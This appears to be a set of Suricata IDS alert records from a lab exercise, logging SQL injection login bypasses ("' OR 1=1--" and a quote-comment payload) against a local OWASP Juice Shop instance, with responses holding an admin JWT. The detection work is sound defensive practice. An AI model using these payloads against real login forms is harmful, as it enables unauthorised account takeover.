@@ -1,0 +1,322 @@
+[
+  {
+    "timestamp": "2026-10-27T21:12:32.687798+0000",
+    "flow_id": 76450195612071,
+    "in_iface": "eth0",
+    "event_type": "alert",
+    "src_ip": "192.168.65.1",
+    "src_port": 26141,
+    "dest_ip": "172.17.0.2",
+    "dest_port": 3000,
+    "proto": "TCP",
+    "ip_v": 4,
+    "pkt_src": "wire/pcap",
+    "metadata": {
+      "flowbits": [
+        "p5.sqli.login"
+      ]
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 1000001,
+      "rev": 3,
+      "signature": "P5 JUICE-SHOP SQLi intento - tautologia OR en POST /rest/user/login",
+      "category": "Web Application Attack",
+      "severity": 2,
+      "metadata": {
+        "attack_target": [
+          "Web_Server"
+        ],
+        "punto": [
+          "P5"
+        ],
+        "signature_severity": [
+          "Major"
+        ]
+      }
+    },
+    "ts_progress": "request_complete",
+    "tc_progress": "response_complete",
+    "http": {
+      "hostname": "localhost",
+      "http_port": 3000,
+      "url": "/rest/user/login",
+      "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "http_content_type": "application/json",
+      "http_refer": "http://localhost:3000/",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 784,
+      "http_request_body_printable": "{\"email\":\"' OR 1=1--\",\"password\":\"cualquiercosa\"}",
+      "http_response_body_printable": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTN9.F23e91osb-TzakVBahzE3nto2GkJgavBG8xpH3kRxCEgEb4Y0iNPWPx98datvc7GcE9PVRcVFtKjFMDfxdrYfmr6yNOaAuSx8qGoegBB1vKpTWhEjQLcLPo-IFRw0IGFwI1tWz535ZQRcnL5BunPbOQYywiN4zw53gvxzdbr88g\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    },
+    "files": [
+      {
+        "filename": "/rest/user/login",
+        "gaps": false,
+        "state": "CLOSED",
+        "stored": false,
+        "size": 49,
+        "tx_id": 0
+      }
+    ],
+    "app_proto": "http",
+    "direction": "to_server",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 669,
+      "bytes_toclient": 1376,
+      "start": "2026-10-27T21:12:32.673159+0000",
+      "src_ip": "192.168.65.1",
+      "dest_ip": "172.17.0.2",
+      "src_port": 26141,
+      "dest_port": 3000
+    },
+    "payload_printable": "POST /rest/user/login HTTP/1.1\r\nHost: localhost:3000\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: deflate, gzip\r\nContent-Type: application/json\r\nOrigin: http://localhost:3000\r\nReferer: http://localhost:3000/\r\nContent-Length: 49\r\n\r\n{\"email\":\"' OR 1=1--\",\"password\":\"cualquiercosa\"}",
+    "stream": 1
+  },
+  {
+    "timestamp": "2026-10-27T21:12:32.688509+0000",
+    "flow_id": 76450195612071,
+    "in_iface": "eth0",
+    "event_type": "alert",
+    "src_ip": "172.17.0.2",
+    "src_port": 3000,
+    "dest_ip": "192.168.65.1",
+    "dest_port": 26141,
+    "proto": "TCP",
+    "ip_v": 4,
+    "pkt_src": "wire/pcap",
+    "metadata": {
+      "flowbits": [
+        "p5.sqli.login"
+      ]
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 1000003,
+      "rev": 2,
+      "signature": "P5 JUICE-SHOP SQLi EXITOSO - login respondio 200 con token JWT tras payload de inyeccion",
+      "category": "Successful Administrator Privilege Gain",
+      "severity": 1,
+      "metadata": {
+        "attack_target": [
+          "Web_Server"
+        ],
+        "punto": [
+          "P5"
+        ],
+        "signature_severity": [
+          "Critical"
+        ]
+      }
+    },
+    "ts_progress": "request_complete",
+    "tc_progress": "response_complete",
+    "http": {
+      "hostname": "localhost",
+      "http_port": 3000,
+      "url": "/rest/user/login",
+      "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "http_content_type": "application/json",
+      "http_refer": "http://localhost:3000/",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 784,
+      "http_request_body_printable": "{\"email\":\"' OR 1=1--\",\"password\":\"cualquiercosa\"}",
+      "http_response_body_printable": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTN9.F23e91osb-TzakVBahzE3nto2GkJgavBG8xpH3kRxCEgEb4Y0iNPWPx98datvc7GcE9PVRcVFtKjFMDfxdrYfmr6yNOaAuSx8qGoegBB1vKpTWhEjQLcLPo-IFRw0IGFwI1tWz535ZQRcnL5BunPbOQYywiN4zw53gvxzdbr88g\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    },
+    "files": [
+      {
+        "filename": "/rest/user/login",
+        "gaps": false,
+        "state": "CLOSED",
+        "stored": false,
+        "size": 784,
+        "tx_id": 0
+      }
+    ],
+    "app_proto": "http",
+    "direction": "to_client",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 735,
+      "bytes_toclient": 1442,
+      "start": "2026-10-27T21:12:32.673159+0000",
+      "src_ip": "192.168.65.1",
+      "dest_ip": "172.17.0.2",
+      "src_port": 26141,
+      "dest_port": 3000
+    },
+    "payload_printable": "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nFeature-Policy: payment 'self'\r\nX-Recruiting: /#/jobs\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 784\r\nETag: W/\"310-eQ4qqyyP/tRR9qN9tRYqRomoUQM\"\r\nVary: Accept-Encoding\r\nDate: Tue, 27 Oct 2026 21:12:32 GMT\r\nConnection: keep-alive\r\nKeep-Alive: timeout=5\r\n\r\n{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTN9.F23e91osb-TzakVBahzE3nto2GkJgavBG8xpH3kRxCEgEb4Y0iNPWPx98datvc7GcE9PVRcVFtKjFMDfxdrYfmr6yNOaAuSx8qGoegBB1vKpTWhEjQLcLPo-IFRw0IGFwI1tWz535ZQRcnL5BunPbOQYywiN4zw53gvxzdbr88g\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+    "stream": 1
+  },
+  {
+    "timestamp": "2026-10-27T21:12:33.753397+0000",
+    "flow_id": 363326953275750,
+    "in_iface": "eth0",
+    "event_type": "alert",
+    "src_ip": "192.168.65.1",
+    "src_port": 16299,
+    "dest_ip": "172.17.0.2",
+    "dest_port": 3000,
+    "proto": "TCP",
+    "ip_v": 4,
+    "pkt_src": "wire/pcap",
+    "metadata": {
+      "flowbits": [
+        "p5.sqli.login"
+      ]
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 1000002,
+      "rev": 2,
+      "signature": "P5 JUICE-SHOP SQLi intento - comilla + comentario SQL en POST /rest/user/login",
+      "category": "Web Application Attack",
+      "severity": 2,
+      "metadata": {
+        "attack_target": [
+          "Web_Server"
+        ],
+        "punto": [
+          "P5"
+        ],
+        "signature_severity": [
+          "Major"
+        ]
+      }
+    },
+    "ts_progress": "request_complete",
+    "tc_progress": "response_complete",
+    "http": {
+      "hostname": "localhost",
+      "http_port": 3000,
+      "url": "/rest/user/login",
+      "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "http_content_type": "application/json",
+      "http_refer": "http://localhost:3000/",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 784,
+      "http_request_body_printable": "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}",
+      "http_response_body_printable": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTR9.rGWAmNoH6pUcpqogGVjqnlZ_PDNYRIxsPC15-P0vdUHRCo7O4T8utItLye0LtvEp-yqAD3_wZ1Lhkb6a7WVrR4Qhc6i8E8uzze-w10USe-_7SLmJzohFPDpWBbsWIhtBA88fxKYIFHfoPBWUqPalqtpujlPH7mvC8UI3FrFkKV0\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    },
+    "files": [
+      {
+        "filename": "/rest/user/login",
+        "gaps": false,
+        "state": "CLOSED",
+        "stored": false,
+        "size": 47,
+        "tx_id": 0
+      }
+    ],
+    "app_proto": "http",
+    "direction": "to_server",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 667,
+      "bytes_toclient": 1376,
+      "start": "2026-10-27T21:12:33.739953+0000",
+      "src_ip": "192.168.65.1",
+      "dest_ip": "172.17.0.2",
+      "src_port": 16299,
+      "dest_port": 3000
+    },
+    "payload_printable": "POST /rest/user/login HTTP/1.1\r\nHost: localhost:3000\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\r\nAccept: */*\r\nAccept-Encoding: deflate, gzip\r\nContent-Type: application/json\r\nOrigin: http://localhost:3000\r\nReferer: http://localhost:3000/\r\nContent-Length: 47\r\n\r\n{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}",
+    "stream": 1
+  },
+  {
+    "timestamp": "2026-10-27T21:12:33.754282+0000",
+    "flow_id": 363326953275750,
+    "in_iface": "eth0",
+    "event_type": "alert",
+    "src_ip": "172.17.0.2",
+    "src_port": 3000,
+    "dest_ip": "192.168.65.1",
+    "dest_port": 16299,
+    "proto": "TCP",
+    "ip_v": 4,
+    "pkt_src": "wire/pcap",
+    "metadata": {
+      "flowbits": [
+        "p5.sqli.login"
+      ]
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 1000003,
+      "rev": 2,
+      "signature": "P5 JUICE-SHOP SQLi EXITOSO - login respondio 200 con token JWT tras payload de inyeccion",
+      "category": "Successful Administrator Privilege Gain",
+      "severity": 1,
+      "metadata": {
+        "attack_target": [
+          "Web_Server"
+        ],
+        "punto": [
+          "P5"
+        ],
+        "signature_severity": [
+          "Critical"
+        ]
+      }
+    },
+    "ts_progress": "request_complete",
+    "tc_progress": "response_complete",
+    "http": {
+      "hostname": "localhost",
+      "http_port": 3000,
+      "url": "/rest/user/login",
+      "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+      "http_content_type": "application/json",
+      "http_refer": "http://localhost:3000/",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 784,
+      "http_request_body_printable": "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}",
+      "http_response_body_printable": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTR9.rGWAmNoH6pUcpqogGVjqnlZ_PDNYRIxsPC15-P0vdUHRCo7O4T8utItLye0LtvEp-yqAD3_wZ1Lhkb6a7WVrR4Qhc6i8E8uzze-w10USe-_7SLmJzohFPDpWBbsWIhtBA88fxKYIFHfoPBWUqPalqtpujlPH7mvC8UI3FrFkKV0\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    },
+    "files": [
+      {
+        "filename": "/rest/user/login",
+        "gaps": false,
+        "state": "CLOSED",
+        "stored": false,
+        "size": 784,
+        "tx_id": 0
+      }
+    ],
+    "app_proto": "http",
+    "direction": "to_client",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 4,
+      "bytes_toserver": 733,
+      "bytes_toclient": 1442,
+      "start": "2026-10-27T21:12:33.739953+0000",
+      "src_ip": "192.168.65.1",
+      "dest_ip": "172.17.0.2",
+      "src_port": 16299,
+      "dest_port": 3000
+    },
+    "payload_printable": "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nFeature-Policy: payment 'self'\r\nX-Recruiting: /#/jobs\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 784\r\nETag: W/\"310-6+ijTa1FqdOP3fowv1kkH9OQLuo\"\r\nVary: Accept-Encoding\r\nDate: Tue, 27 Oct 2026 21:12:33 GMT\r\nConnection: keep-alive\r\nKeep-Alive: timeout=5\r\n\r\n{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0yNyAyMTowMzoyNy4zNzQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTMxMzU1NTR9.rGWAmNoH6pUcpqogGVjqnlZ_PDNYRIxsPC15-P0vdUHRCo7O4T8utItLye0LtvEp-yqAD3_wZ1Lhkb6a7WVrR4Qhc6i8E8uzze-w10USe-_7SLmJzohFPDpWBbsWIhtBA88fxKYIFHfoPBWUqPalqtpujlPH7mvC8UI3FrFkKV0\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+    "stream": 1
+  }
+]
